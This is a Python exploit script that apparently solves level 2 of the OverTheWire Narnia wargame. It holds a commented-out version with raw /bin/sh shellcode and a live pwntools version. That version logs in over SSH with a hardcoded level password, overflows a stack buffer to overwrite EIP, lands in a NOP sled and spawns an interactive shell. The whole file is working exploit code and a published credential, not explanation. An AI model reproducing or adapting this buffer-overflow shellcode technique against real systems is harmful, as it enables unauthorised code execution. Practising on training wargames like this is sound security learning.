#!/usr/bin/env python

"""
import struct

padding = 'A' * 132                     # overflow the buffer and eip
new_eip = struct.pack('I', 0xffffd630)  # change eip to point to stack
nops = '\x90' * 80                      # nop sled and shellcode
shell = '\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68'

print padding + new_eip + nops + shell
"""
from pwn import *

context.update(arch='amd64', os='linux')
session = ssh(user='narnia2', port=2226, host='narnia.labs.overthewire.org', password='nairiepecu')

shellcode = shellcraft.sh()

payload  = cyclic(132)          # amount of bytes to overflow buffer and ebp
payload += p32(0xffffd630)      # overwrite eip to point to this stack address
payload += asm('nop') * 80      # eip will jump to some point in nopsled
payload += asm(shellcode)       # 'bin/sh' assembly code

io = session.process(['/narnia/narnia2', payload])
io.interactive()
